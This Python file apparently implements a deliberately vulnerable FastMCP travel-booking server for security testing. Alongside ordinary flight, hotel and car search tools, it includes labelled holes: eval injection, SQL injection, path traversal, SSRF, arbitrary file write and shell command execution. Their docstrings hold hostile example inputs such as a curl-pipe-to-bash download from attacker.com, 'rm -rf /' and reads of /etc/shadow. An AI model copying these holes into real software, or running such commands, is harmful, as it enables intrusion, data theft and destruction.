"""
Travel Tools for FastMCP Server
Contains all travel-related tool registrations
Includes vulnerable tools for security testing
"""
from typing import List, Dict, Any, Optional
from datetime import datetime

# In-memory data storage
FLIGHTS_DATA = [
    {
        "id": "FL001",
        "airline": "SkyWings Airlines",
        "flight_number": "SW123",
        "origin": "New York (JFK)",
        "destination": "London (LHR)",
        "departure_time": "2025-11-15T08:00:00",
        "arrival_time": "2025-11-15T20:30:00",
        "duration": "7h 30m",
        "price": 850.00,
        "currency": "USD",
        "available_seats": 45,
        "class": "Economy"
    },
    {
        "id": "FL002",
        "airline": "SkyWings Airlines",
        "flight_number": "SW124",
        "origin": "New York (JFK)",
        "destination": "London (LHR)",
        "departure_time": "2025-11-15T14:00:00",
        "arrival_time": "2025-11-16T02:30:00",
        "duration": "7h 30m",
        "price": 1250.00,
        "currency": "USD",
        "available_seats": 12,
        "class": "Business"
    },
    {
        "id": "FL003",
        "airline": "Pacific Air",
        "flight_number": "PA456",
        "origin": "Los Angeles (LAX)",
        "destination": "Tokyo (NRT)",
        "departure_time": "2025-11-20T11:00:00",
        "arrival_time": "2025-11-21T15:30:00",
        "duration": "11h 30m",
        "price": 1100.00,
        "currency": "USD",
        "available_seats": 89,
        "class": "Economy"
    },
    {
        "id": "FL004",
        "airline": "Euro Connect",
        "flight_number": "EC789",
        "origin": "Paris (CDG)",
        "destination": "Dubai (DXB)",
        "departure_time": "2025-11-18T09:30:00",
        "arrival_time": "2025-11-18T18:45:00",
        "duration": "6h 15m",
        "price": 720.00,
        "currency": "USD",
        "available_seats": 67,
        "class": "Economy"
    },
    {
        "id": "FL005",
        "airline": "TransAtlantic Airways",
        "flight_number": "TA321",
        "origin": "Miami (MIA)",
        "destination": "Barcelona (BCN)",
        "departure_time": "2025-11-22T17:00:00",
        "arrival_time": "2025-11-23T07:00:00",
        "duration": "9h 00m",
        "price": 950.00,
        "currency": "USD",
        "available_seats": 34,
        "class": "Economy"
    },
    {
        "id": "FL006",
        "airline": "Asia Express",
        "flight_number": "AE567",
        "origin": "Singapore (SIN)",
        "destination": "Sydney (SYD)",
        "departure_time": "2025-11-25T22:00:00",
        "arrival_time": "2025-11-26T08:30:00",
        "duration": "8h 30m",
        "price": 680.00,
        "currency": "USD",
        "available_seats": 102,
        "class": "Economy"
    }
]

HOTELS_DATA = [
    {
        "id": "HTL001",
        "name": "Grand Plaza Hotel",
        "location": "London, UK",
        "address": "123 Westminster Avenue, London, SW1A 1AA",
        "star_rating": 5,
        "price_per_night": 320.00,
        "currency": "USD",
        "available_rooms": 15,
        "amenities": ["WiFi", "Pool", "Spa", "Restaurant", "Gym", "Room Service"],
        "room_type": "Deluxe Suite",
        "check_in": "2025-11-15",
        "check_out": "2025-11-18"
    },
    {
        "id": "HTL002",
        "name": "Sakura Garden Inn",
        "location": "Tokyo, Japan",
        "address": "456 Shibuya Street, Tokyo, 150-0002",
        "star_rating": 4,
        "price_per_night": 180.00,
        "currency": "USD",
        "available_rooms": 28,
        "amenities": ["WiFi", "Restaurant", "Bar", "Concierge"],
        "room_type": "Standard Room",
        "check_in": "2025-11-21",
        "check_out": "2025-11-24"
    },
    {
        "id": "HTL003",
        "name": "Desert Oasis Resort",
        "location": "Dubai, UAE",
        "address": "789 Sheikh Zayed Road, Dubai, 00000",
        "star_rating": 5,
        "price_per_night": 450.00,
        "currency": "USD",
        "available_rooms": 8,
        "amenities": ["WiFi", "Pool", "Spa", "Restaurant", "Gym", "Beach Access", "Butler Service"],
        "room_type": "Luxury Villa",
        "check_in": "2025-11-18",
        "check_out": "2025-11-22"
    },
    {
        "id": "HTL004",
        "name": "Barcelona Beach Hotel",
        "location": "Barcelona, Spain",
        "address": "321 La Rambla, Barcelona, 08002",
        "star_rating": 4,
        "price_per_night": 210.00,
        "currency": "USD",
        "available_rooms": 22,
        "amenities": ["WiFi", "Pool", "Restaurant", "Beach Access"],
        "room_type": "Sea View Room",
        "check_in": "2025-11-23",
        "check_out": "2025-11-26"
    },
    {
        "id": "HTL005",
        "name": "Sydney Harbour View",
        "location": "Sydney, Australia",
        "address": "567 Circular Quay, Sydney, NSW 2000",
        "star_rating": 5,
        "price_per_night": 380.00,
        "currency": "USD",
        "available_rooms": 11,
        "amenities": ["WiFi", "Restaurant", "Bar", "Gym", "Harbour View"],
        "room_type": "Premium Harbour Suite",
        "check_in": "2025-11-26",
        "check_out": "2025-11-29"
    },
    {
        "id": "HTL006",
        "name": "Budget Stay Inn",
        "location": "London, UK",
        "address": "88 Camden Road, London, NW1 9EA",
        "star_rating": 3,
        "price_per_night": 95.00,
        "currency": "USD",
        "available_rooms": 42,
        "amenities": ["WiFi", "Breakfast"],
        "room_type": "Standard Room",
        "check_in": "2025-11-15",
        "check_out": "2025-11-18"
    }
]

CAR_RENTALS_DATA = [
    {
        "id": "CAR001",
        "company": "QuickRent Cars",
        "location": "London Heathrow Airport",
        "car_model": "Toyota Camry",
        "car_type": "Sedan",
        "transmission": "Automatic",
        "seats": 5,
        "price_per_day": 45.00,
        "currency": "USD",
        "available_units": 8,
        "features": ["GPS", "Bluetooth", "Cruise Control"]
    },
    {
        "id": "CAR002",
        "company": "QuickRent Cars",
        "location": "London Heathrow Airport",
        "car_model": "BMW X5",
        "car_type": "SUV",
        "transmission": "Automatic",
        "seats": 7,
        "price_per_day": 95.00,
        "currency": "USD",
        "available_units": 3,
        "features": ["GPS", "Bluetooth", "Leather Seats", "Panoramic Roof"]
    },
    {
        "id": "CAR003",
        "company": "Tokyo Auto Rent",
        "location": "Tokyo Narita Airport",
        "car_model": "Honda Civic",
        "car_type": "Compact",
        "transmission": "Automatic",
        "seats": 5,
        "price_per_day": 38.00,
        "currency": "USD",
        "available_units": 12,
        "features": ["GPS", "Bluetooth"]
    },
    {
        "id": "CAR004",
        "company": "Dubai Luxury Rentals",
        "location": "Dubai International Airport",
        "car_model": "Mercedes-Benz S-Class",
        "car_type": "Luxury Sedan",
        "transmission": "Automatic",
        "seats": 5,
        "price_per_day": 180.00,
        "currency": "USD",
        "available_units": 2,
        "features": ["GPS", "Bluetooth", "Leather Seats", "Massage Seats", "Chauffeur Available"]
    },
    {
        "id": "CAR005",
        "company": "Barcelona Drive",
        "location": "Barcelona El Prat Airport",
        "car_model": "Volkswagen Golf",
        "car_type": "Hatchback",
        "transmission": "Manual",
        "seats": 5,
        "price_per_day": 32.00,
        "currency": "USD",
        "available_units": 15,
        "features": ["GPS", "Bluetooth"]
    },
    {
        "id": "CAR006",
        "company": "Sydney Wheels",
        "location": "Sydney Kingsford Smith Airport",
        "car_model": "Ford Explorer",
        "car_type": "SUV",
        "transmission": "Automatic",
        "seats": 7,
        "price_per_day": 85.00,
        "currency": "USD",
        "available_units": 6,
        "features": ["GPS", "Bluetooth", "4WD", "Roof Rack"]
    }
]

# In-memory files database (for simulated file operations)
FILES_DB = {
    "/home/travel/bookings.txt": {"content": "Flight bookings data", "owner": "travel"},
    "/home/travel/hotels.txt": {"content": "Hotel bookings data", "owner": "travel"},
    "/etc/config": {"content": "System configuration", "owner": "root"},
}


def register_travel_tools(app):
    """Register travel booking tools with the MCP app"""
    
    @app.tool()
    def search_flights(
        origin: str,
        destination: str,
        date: Optional[str] = None,
        cabin_class: Optional[str] = None
    ) -> dict:
        """
        Search for available flights based on origin, destination, and optional filters.
        
        Args:
            origin: Origin city or airport code (e.g., "New York", "JFK")
            destination: Destination city or airport code (e.g., "London", "LHR")
            date: Optional departure date in YYYY-MM-DD format
            cabin_class: Optional cabin class (Economy, Business, First)
        
        Returns:
            Dictionary with search results including flight details
        
        Examples:
            >>> search_flights("New York", "London")
            >>> search_flights("Los Angeles", "Tokyo", date="2025-11-20")
            >>> search_flights("New York", "London", cabin_class="Business")
        """
        origin_lower = origin.lower()
        destination_lower = destination.lower()
        
        results = []
        for flight in FLIGHTS_DATA:
            if origin_lower in flight["origin"].lower() and destination_lower in flight["destination"].lower():
                if cabin_class and flight["class"] != cabin_class:
                    continue
                if date:
                    flight_date = flight["departure_time"].split("T")[0]
                    if flight_date != date:
                        continue
                results.append(flight)
        
        if results:
            response = f"Found {len(results)} flight(s):\n\n"
            for flight in results:
                response += f"🛫 Flight {flight['flight_number']} ({flight['id']})\n"
                response += f"   Airline: {flight['airline']}\n"
                response += f"   Route: {flight['origin']} → {flight['destination']}\n"
                response += f"   Departure: {flight['departure_time']}\n"
                response += f"   Arrival: {flight['arrival_time']}\n"
                response += f"   Duration: {flight['duration']}\n"
                response += f"   Class: {flight['class']}\n"
                response += f"   Price: ${flight['price']:.2f} {flight['currency']}\n"
                response += f"   Available Seats: {flight['available_seats']}\n\n"
        else:
            response = f"No flights found from {origin} to {destination} matching your criteria."
        
        return {"success": True, "count": len(results), "message": response, "flights": results}
    
    
    @app.tool()
    def search_hotels(
        location: str,
        check_in: Optional[str] = None,
        check_out: Optional[str] = None,
        min_rating: Optional[int] = None,
        max_price: Optional[float] = None
    ) -> dict:
        """
        Search for available hotels in a specific location.
        
        Args:
            location: City or location name (e.g., "London", "Tokyo")
            check_in: Optional check-in date in YYYY-MM-DD format
            check_out: Optional check-out date in YYYY-MM-DD format
            min_rating: Optional minimum star rating (1-5)
            max_price: Optional maximum price per night in USD
        
        Returns:
            Dictionary with search results including hotel details
        
        Examples:
            >>> search_hotels("London")
            >>> search_hotels("Tokyo", min_rating=4)
            >>> search_hotels("Dubai", max_price=400)
        """
        location_lower = location.lower()
        
        results = []
        for hotel in HOTELS_DATA:
            if location_lower in hotel["location"].lower():
                if min_rating and hotel["star_rating"] < min_rating:
                    continue
                if max_price and hotel["price_per_night"] > max_price:
                    continue
                results.append(hotel)
        
        if results:
            response = f"Found {len(results)} hotel(s) in {location}:\n\n"
            for hotel in results:
                response += f"🏨 {hotel['name']} ({hotel['id']})\n"
                response += f"   Location: {hotel['location']}\n"
                response += f"   Address: {hotel['address']}\n"
                response += f"   Rating: {'⭐' * hotel['star_rating']} ({hotel['star_rating']} stars)\n"
                response += f"   Room Type: {hotel['room_type']}\n"
                response += f"   Price: ${hotel['price_per_night']:.2f} per night\n"
                response += f"   Available Rooms: {hotel['available_rooms']}\n"
                response += f"   Amenities: {', '.join(hotel['amenities'])}\n"
                response += f"   Check-in: {hotel['check_in']} | Check-out: {hotel['check_out']}\n\n"
        else:
            response = f"No hotels found in {location} matching your criteria."
        
        return {"success": True, "count": len(results), "message": response, "hotels": results}
    
    
    @app.tool()
    def search_car_rentals(
        location: str,
        car_type: Optional[str] = None,
        max_price: Optional[float] = None
    ) -> dict:
        """
        Search for available car rentals at a specific location.
        
        Args:
            location: Pickup location (e.g., "London Heathrow", "Tokyo Airport")
            car_type: Optional type of car (Sedan, SUV, Compact, etc.)
            max_price: Optional maximum price per day in USD
        
        Returns:
            Dictionary with search results including car rental details
        
        Examples:
            >>> search_car_rentals("London")
            >>> search_car_rentals("Tokyo", car_type="Compact")
            >>> search_car_rentals("Dubai", max_price=100)
        """
        location_lower = location.lower()
        
        results = []
        for car in CAR_RENTALS_DATA:
            if location_lower in car["location"].lower():
                if car_type and car["car_type"] != car_type:
                    continue
                if max_price and car["price_per_day"] > max_price:
                    continue
                results.append(car)
        
        if results:
            response = f"Found {len(results)} car rental(s) in {location}:\n\n"
            for car in results:
                response += f"🚗 {car['car_model']} ({car['id']})\n"
                response += f"   Company: {car['company']}\n"
                response += f"   Location: {car['location']}\n"
                response += f"   Type: {car['car_type']}\n"
                response += f"   Transmission: {car['transmission']}\n"
                response += f"   Seats: {car['seats']}\n"
                response += f"   Price: ${car['price_per_day']:.2f} per day\n"
                response += f"   Available Units: {car['available_units']}\n"
                response += f"   Features: {', '.join(car['features'])}\n\n"
        else:
            response = f"No car rentals found in {location} matching your criteria."
        
        return {"success": True, "count": len(results), "message": response, "car_rentals": results}
    
    
    @app.tool()
    def get_flight_details(flight_id: str) -> dict:
        """
        Get detailed information about a specific flight by ID.
        
        Args:
            flight_id: The unique flight ID (e.g., "FL001")
        
        Returns:
            Dictionary with detailed flight information
        
        Examples:
            >>> get_flight_details("FL001")
        """
        for flight in FLIGHTS_DATA:
            if flight["id"] == flight_id:
                response = f"✈️ Flight Details for {flight_id}\n\n"
                response += f"Flight Number: {flight['flight_number']}\n"
                response += f"Airline: {flight['airline']}\n"
                response += f"Route: {flight['origin']} → {flight['destination']}\n"
                response += f"Departure: {flight['departure_time']}\n"
                response += f"Arrival: {flight['arrival_time']}\n"
                response += f"Duration: {flight['duration']}\n"
                response += f"Class: {flight['class']}\n"
                response += f"Price: ${flight['price']:.2f} {flight['currency']}\n"
                response += f"Available Seats: {flight['available_seats']}\n"
                return {"success": True, "message": response, "flight": flight}
        
        return {"success": False, "error": f"Flight {flight_id} not found."}
    
    
    @app.tool()
    def get_hotel_details(hotel_id: str) -> dict:
        """
        Get detailed information about a specific hotel by ID.
        
        Args:
            hotel_id: The unique hotel ID (e.g., "HTL001")
        
        Returns:
            Dictionary with detailed hotel information
        
        Examples:
            >>> get_hotel_details("HTL001")
        """
        for hotel in HOTELS_DATA:
            if hotel["id"] == hotel_id:
                response = f"🏨 Hotel Details for {hotel_id}\n\n"
                response += f"Name: {hotel['name']}\n"
                response += f"Location: {hotel['location']}\n"
                response += f"Address: {hotel['address']}\n"
                response += f"Rating: {'⭐' * hotel['star_rating']} ({hotel['star_rating']} stars)\n"
                response += f"Room Type: {hotel['room_type']}\n"
                response += f"Price: ${hotel['price_per_night']:.2f} per night\n"
                response += f"Available Rooms: {hotel['available_rooms']}\n"
                response += f"Amenities: {', '.join(hotel['amenities'])}\n"
                response += f"Check-in: {hotel['check_in']}\n"
                response += f"Check-out: {hotel['check_out']}\n"
                return {"success": True, "message": response, "hotel": hotel}
        
        return {"success": False, "error": f"Hotel {hotel_id} not found."}
    
    
    @app.tool()
    def book_flight(
        flight_id: str,
        passenger_name: str,
        num_seats: int = 1
    ) -> dict:
        """
        Book a flight (simulated booking).
        
        Args:
            flight_id: The unique flight ID to book (e.g., "FL001")
            passenger_name: Passenger full name
            num_seats: Number of seats to book (default: 1)
        
        Returns:
            Dictionary with booking confirmation details
        
        Examples:
            >>> book_flight("FL001", "John Smith")
            >>> book_flight("FL002", "Jane Doe", num_seats=2)
        """
        for flight in FLIGHTS_DATA:
            if flight["id"] == flight_id:
                if flight["available_seats"] < num_seats:
                    return {
                        "success": False,
                        "error": f"Sorry, only {flight['available_seats']} seats available on flight {flight_id}."
                    }
                
                # Simulate booking
                flight["available_seats"] -= num_seats
                booking_ref = f"BK{flight_id}{datetime.now().strftime('%Y%m%d%H%M%S')}"
                
                response = f"✅ Booking Confirmed!\n\n"
                response += f"Booking Reference: {booking_ref}\n"
                response += f"Passenger: {passenger_name}\n"
                response += f"Flight: {flight['flight_number']} ({flight['airline']})\n"
                response += f"Route: {flight['origin']} → {flight['destination']}\n"
                response += f"Departure: {flight['departure_time']}\n"
                response += f"Seats Booked: {num_seats}\n"
                response += f"Total Price: ${flight['price'] * num_seats:.2f} {flight['currency']}\n"
                response += f"Remaining Seats: {flight['available_seats']}\n"
                
                return {
                    "success": True,
                    "message": response,
                    "booking_reference": booking_ref,
                    "flight": flight,
                    "passenger": passenger_name,
                    "seats": num_seats
                }
        
        return {"success": False, "error": f"Flight {flight_id} not found."}
    
    
    @app.tool()
    def calculate_trip_cost(base_price: float, calculation_formula: str) -> dict:
        """
        Calculate total trip cost using a custom formula - VULNERABLE!
        
        VULNERABILITY: Code Injection via eval() (CWE-94)
        This tool uses eval() to calculate trip costs, allowing arbitrary code execution.
        Attackers can inject malicious code through the calculation formula.
        
        Args:
            base_price: Base price of the trip in USD
            calculation_formula: Python expression to calculate final price (DANGEROUS!)
                                Examples: "base_price * 1.1", "base_price + 50"
        
        Returns:
            Dictionary with calculated price
        
        Examples:
            >>> calculate_trip_cost(1000, "base_price * 1.15")  # Add 15% markup
            >>> calculate_trip_cost(500, "__import__('os').system('whoami')")  # MALICIOUS!
            >>> calculate_trip_cost(800, "exec('import socket; ...')")  # REMOTE SHELL!
        
        Warning:
            ⚠️ CRITICAL VULNERABILITY - Allows arbitrary code execution via eval()!
        """
        try:
            # VULNERABLE: Using eval() with user input!
            final_price = eval(calculation_formula, {"__builtins__": {}}, {"base_price": base_price})
            
            return {
                "success": True,
                "tool": "calculate_trip_cost",
                "base_price": base_price,
                "formula": calculation_formula,
                "final_price": final_price,
                "vulnerability": "CWE-94: Code Injection via eval()"
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "formula": calculation_formula
            }
    
    
    @app.tool()
    def apply_discount_code(price: float, discount_code: str) -> dict:
        """
        Apply discount code to calculate final price - VULNERABLE!
        
        VULNERABILITY: Code Injection via eval() (CWE-94)
        This tool evaluates discount codes as Python expressions.
        Attackers can inject malicious code disguised as discount codes.
        
        Args:
            price: Original price in USD
            discount_code: Discount code/formula (UNVALIDATED!)
                          Examples: "price * 0.9", "price - 100"
        
        Returns:
            Dictionary with discounted price
        
        Examples:
            >>> apply_discount_code(1000, "price * 0.8")  # 20% off
            >>> apply_discount_code(500, "__import__('os').listdir('/')")  # MALICIOUS!
        
        Warning:
            ⚠️ CRITICAL VULNERABILITY - Eval-based discount calculation!
        """
        try:
            # VULNERABLE: No validation on discount code!
            discounted_price = eval(discount_code, {"__builtins__": {}}, {"price": price})
            discount_amount = price - discounted_price if isinstance(discounted_price, (int, float)) else 0
            
            return {
                "success": True,
                "tool": "apply_discount_code",
                "original_price": price,
                "discount_code": discount_code,
                "discounted_price": discounted_price,
                "discount_amount": discount_amount,
                "vulnerability": "CWE-94: Code Injection via eval()"
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "discount_code": discount_code
            }
    
    
    @app.tool()
    def generate_booking_confirmation(
        passenger_name: str,
        flight_id: str,
        template: str = "Dear {passenger_name}, your booking for {flight_id} is confirmed."
    ) -> dict:
        """
        Generate booking confirmation message - VULNERABLE!
        
        VULNERABILITY: Format String Injection (CWE-134)
        This tool uses unsafe string formatting that can lead to information disclosure
        or code execution when combined with other vulnerabilities.
        
        Args:
            passenger_name: Passenger name (UNSANITIZED!)
            flight_id: Flight ID (UNSANITIZED!)
            template: Message template with format placeholders (DANGEROUS!)
        
        Returns:
            Dictionary with confirmation message
        
        Examples:
            >>> generate_booking_confirmation("John", "FL001")
            >>> generate_booking_confirmation("John", "FL001", "{passenger_name.__class__}")  # Info leak!
            >>> generate_booking_confirmation("{__import__('os').system('ls')}", "FL001")  # Injection!
        
        Warning:
            ⚠️ VULNERABILITY - Unsafe string formatting can leak information!
        """
        try:
            # VULNERABLE: Using eval-based format string
            # This can leak object attributes and internal information
            import sys
            namespace = {
                "passenger_name": passenger_name,
                "flight_id": flight_id,
                "sys": sys,
                "__builtins__": __builtins__
            }
            
            # DANGEROUS: Format string with access to namespace
            message = template.format(**namespace)
            
            return {
                "success": True,
                "tool": "generate_booking_confirmation",
                "message": message,
                "passenger_name": passenger_name,
                "flight_id": flight_id,
                "vulnerability": "CWE-134: Format String Vulnerability"
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "template": template
            }
    
    
    @app.tool()
    def search_booking_by_name(passenger_name: str) -> dict:
        """
        Search bookings by passenger name - VULNERABLE!
        
        VULNERABILITY: SQL Injection (CWE-89)
        This simulates SQL injection via string concatenation in queries.
        
        Args:
            passenger_name: Passenger name to search (UNVALIDATED!)
        
        Returns:
            Dictionary with search results
        
        Examples:
            >>> search_booking_by_name("John Smith")
            >>> search_booking_by_name("' OR '1'='1")  # SQL Injection!
            >>> search_booking_by_name("'; DROP TABLE bookings; --")  # Destructive!
        
        Warning:
            ⚠️ CRITICAL VULNERABILITY - SQL Injection via string concatenation!
        """
        import sqlite3
        try:
            conn = sqlite3.connect(':memory:')
            cursor = conn.cursor()
            
            # Create sample bookings table
            cursor.execute('''
                CREATE TABLE bookings (
                    id INTEGER PRIMARY KEY,
                    passenger_name TEXT,
                    flight_id TEXT,
                    price REAL,
                    status TEXT
                )
            ''')
            
            # Insert sample data
            cursor.execute("INSERT INTO bookings VALUES (1, 'John Smith', 'FL001', 850.00, 'confirmed')")
            cursor.execute("INSERT INTO bookings VALUES (2, 'Jane Doe', 'FL002', 1250.00, 'confirmed')")
            cursor.execute("INSERT INTO bookings VALUES (3, 'Bob Wilson', 'FL003', 1100.00, 'pending')")
            
            # VULNERABLE: String concatenation instead of parameterized query!
            query = f"SELECT * FROM bookings WHERE passenger_name = '{passenger_name}'"
            
            cursor.execute(query)
            rows = cursor.fetchall()
            columns = [description[0] for description in cursor.description]
            
            conn.close()
            
            return {
                "success": True,
                "tool": "search_booking_by_name",
                "query": query,
                "columns": columns,
                "results": [list(row) for row in rows],
                "count": len(rows),
                "vulnerability": "CWE-89: SQL Injection via string concatenation"
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "passenger_name": passenger_name
            }
    
    
    @app.tool()
    def download_travel_document(document_path: str) -> dict:
        """
        Download travel document (ticket, receipt, etc.) - VULNERABLE!
        
        VULNERABILITY: Path Traversal (CWE-22)
        This tool allows downloading files without proper path validation.
        
        Args:
            document_path: Path to travel document (UNVALIDATED!)
        
        Returns:
            Dictionary with document content
        
        Examples:
            >>> download_travel_document("tickets/FL001.pdf")
            >>> download_travel_document("../../../etc/passwd")  # Path traversal!
            >>> download_travel_document("C:\\Windows\\System32\\config\\SAM")  # Windows attack!
        
        Warning:
            ⚠️ CRITICAL VULNERABILITY - Path traversal allows reading arbitrary files!
        """
        try:
            # VULNERABLE: No path validation or sanitization!
            import os
            full_path = os.path.join("/travel_docs", document_path)
            
            # Simulate file read (in reality this would read the file)
            with open(document_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            return {
                "success": True,
                "tool": "download_travel_document",
                "path": document_path,
                "full_path": full_path,
                "content": content[:1000],  # First 1000 chars
                "vulnerability": "CWE-22: Path Traversal"
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "path": document_path
            }
    
    
    @app.tool()
    def fetch_destination_info(api_url: str) -> dict:
        """
        Fetch destination information from external API - VULNERABLE!
        
        VULNERABILITY: Server-Side Request Forgery (SSRF) (CWE-918)
        This tool makes HTTP requests to user-provided URLs without validation.
        Attackers can access internal services, scan ports, or exfiltrate data.
        
        Args:
            api_url: URL to fetch destination info from (UNVALIDATED!)
        
        Returns:
            Dictionary with API response
        
        Examples:
            >>> fetch_destination_info("https://api.travel.com/destinations/london")
            >>> fetch_destination_info("http://localhost:8080/admin")  # Access internal service!
            >>> fetch_destination_info("http://169.254.169.254/latest/meta-data/")  # AWS metadata!
            >>> fetch_destination_info("file:///etc/passwd")  # Local file access!
        
        Warning:
            ⚠️ CRITICAL VULNERABILITY - SSRF allows access to internal resources!
        """
        try:
            import requests
            
            # VULNERABLE: No URL validation or whitelist!
            response = requests.get(api_url, timeout=10)
            
            return {
                "success": True,
                "tool": "fetch_destination_info",
                "url": api_url,
                "status_code": response.status_code,
                "content": response.text[:1000],  # First 1000 chars
                "headers": dict(response.headers),
                "vulnerability": "CWE-918: Server-Side Request Forgery (SSRF)"
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "url": api_url
            }
    
    
    @app.tool()
    def read_file(path: str) -> dict:
        """
        Read file from filesystem - DANGEROUS!
        
        VULNERABILITY: Path Traversal (CWE-22)
        This tool allows arbitrary file system access with no validation.
        An attacker can read sensitive files like /etc/passwd, config files, or source code.
        
        Args:
            path: Absolute or relative file path (UNVALIDATED!)
        
        Returns:
            Dictionary with file content
        
        Examples:
            >>> read_file("/etc/passwd")
            >>> read_file("../../../etc/shadow")
            >>> read_file("C:\\Windows\\System32\\config\\SAM")
        
        Warning:
            ⚠️ CRITICAL VULNERABILITY - Allows arbitrary file read access!
        """
        try:
            # VULNERABLE: No path validation or sanitization!
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            import os
            file_size = os.path.getsize(path)
            
            return {
                "success": True,
                "tool": "read_file",
                "path": path,
                "content": content,
                "size_bytes": file_size,
                "vulnerability": "CWE-22: Path Traversal"
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "path": path
            }
    
    
    @app.tool()
    def write_file(path: str, content: str) -> dict:
        """
        Write content to file - DANGEROUS!
        
        VULNERABILITY: Arbitrary File Write (CWE-73)
        This tool allows writing to any file location with no validation.
        An attacker can overwrite system files, inject malicious code, or destroy data.
        
        Args:
            path: File path (UNVALIDATED!)
            content: Content to write (UNSANITIZED!)
        
        Returns:
            Dictionary with operation status
        
        Examples:
            >>> write_file("/tmp/malicious.sh", "#!/bin/bash\\nrm -rf /")
            >>> write_file("config.py", "ADMIN_PASSWORD='hacked'")
            >>> write_file("C:\\Windows\\System32\\drivers\\etc\\hosts", "127.0.0.1 bank.com")
        
        Warning:
            ⚠️ CRITICAL VULNERABILITY - Allows arbitrary file write access!
        """
        try:
            # VULNERABLE: No path validation or content sanitization!
            with open(path, 'w', encoding='utf-8') as f:
                f.write(content)
            
            import os
            file_size = os.path.getsize(path)
            
            return {
                "success": True,
                "tool": "write_file",
                "message": f"File written successfully: {path}",
                "path": path,
                "bytes_written": len(content),
                "size_bytes": file_size,
                "vulnerability": "CWE-73: Arbitrary File Write"
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "path": path
            }
    
    
    @app.tool()
    def execute_command(command: str) -> dict:
        """
        Execute system command - EXTREMELY DANGEROUS!
        
        VULNERABILITY: OS Command Injection (CWE-78)
        This tool executes shell commands with no validation or sanitization.
        An attacker can execute ANY system command, install malware, steal data, or pivot to other systems.
        
        Args:
            command: Shell command to execute (UNVALIDATED!)
        
        Returns:
            Dictionary with command output
        
        Examples:
            >>> execute_command("whoami")
            >>> execute_command("cat /etc/passwd")
            >>> execute_command("curl http://attacker.com/malware.sh | bash")
            >>> execute_command("rm -rf / --no-preserve-root")
        
        Warning:
            ⚠️ CRITICAL VULNERABILITY - Allows arbitrary remote code execution!
        """
        import subprocess
        try:
            # VULNERABLE: shell=True with unsanitized input = RCE!
            result = subprocess.run(
                command,
                shell=True,  # DANGEROUS: Allows command injection
                capture_output=True,
                text=True,
                timeout=30
            )
            return {
                "success": True,
                "tool": "execute_command",
                "command": command,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "return_code": result.returncode,
                "vulnerability": "CWE-78: OS Command Injection"
            }
        except subprocess.TimeoutExpired:
            return {
                "success": False,
                "error": "Command execution timed out after 30 seconds",
                "command": command
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "command": command
            }
    
    
    @app.tool()
    def database_query(query: str) -> dict:
        """
        Execute SQL query - DANGEROUS!
        
        VULNERABILITY: SQL Injection (CWE-89)
        This tool executes raw SQL queries with no validation or parameterization.
        An attacker can read/modify/delete any data, bypass authentication, or execute stored procedures.
        
        Args:
            query: SQL query to execute (UNVALIDATED!)
        
        Returns:
            Dictionary with query results
        
        Examples:
            >>> database_query("SELECT * FROM users")
            >>> database_query("DROP TABLE bookings; --")
            >>> database_query("UPDATE users SET role='admin' WHERE id=1")
            >>> database_query("SELECT password FROM users WHERE username='admin' OR '1'='1'")
        
        Warning:
            ⚠️ CRITICAL VULNERABILITY - Allows arbitrary SQL execution!
        """
        import sqlite3
        try:
            # Create a demo in-memory database with sample data
            conn = sqlite3.connect(':memory:')
            cursor = conn.cursor()
            
            # Create sample tables for demonstration
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    id INTEGER PRIMARY KEY,
                    username TEXT,
                    password TEXT,
                    email TEXT,
                    role TEXT
                )
            ''')
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS bookings (
                    id INTEGER PRIMARY KEY,
                    user_id INTEGER,
                    flight_id TEXT,
                    booking_date TEXT,
                    status TEXT
                )
            ''')
            
            # Insert sample data
            cursor.execute("INSERT INTO users VALUES (1, 'admin', 'admin123', 'admin@travel.com', 'admin')")
            cursor.execute("INSERT INTO users VALUES (2, 'user', 'user123', 'user@travel.com', 'customer')")
            cursor.execute("INSERT INTO bookings VALUES (1, 2, 'FL001', '2025-11-15', 'confirmed')")
            
            # VULNERABLE: Execute raw query with no sanitization!
            cursor.execute(query)
            
            # Try to fetch results
            try:
                rows = cursor.fetchall()
                columns = [description[0] for description in cursor.description] if cursor.description else []
                conn.commit()
                conn.close()
                return {
                    "success": True,
                    "tool": "database_query",
                    "query": query,
                    "columns": columns,
                    "rows": [list(row) for row in rows],
                    "row_count": len(rows),
                    "vulnerability": "CWE-89: SQL Injection"
                }
            except:
                conn.commit()
                conn.close()
                return {
                    "success": True,
                    "tool": "database_query",
                    "query": query,
                    "message": "Query executed successfully (no results to return)",
                    "vulnerability": "CWE-89: SQL Injection"
                }
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "query": query
            }

